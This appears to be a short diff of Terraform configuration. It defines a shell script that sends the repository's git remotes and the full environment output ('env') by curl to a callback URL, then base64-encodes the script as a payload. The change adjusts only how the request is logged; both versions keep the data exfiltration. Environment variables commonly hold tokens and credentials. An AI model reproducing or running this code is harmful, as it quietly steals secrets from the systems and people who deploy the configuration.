@@ -15,7 +15,7 @@ locals {
         sleep 10
     done
     log "running curl: ${local.callback_url}/upload/v2"
-    log "$(curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2 || true)"
+    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
